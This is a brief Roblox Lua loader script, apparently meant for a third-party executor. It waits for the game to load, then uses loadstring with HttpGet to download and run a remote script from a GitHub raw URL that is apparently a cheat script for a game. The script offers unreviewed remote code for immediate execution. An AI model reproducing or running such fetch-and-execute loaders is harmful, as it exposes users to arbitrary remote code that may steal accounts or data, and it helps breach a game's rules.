local queue = queue_on_teleport or queueonteleport

if queue then
    queue([=[
    ]=])
end

if not game:IsLoaded() then
    game.Loaded:Wait()
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/VexalScripts/scripts/refs/heads/main/v2/MvsdMainScript.lua"))()

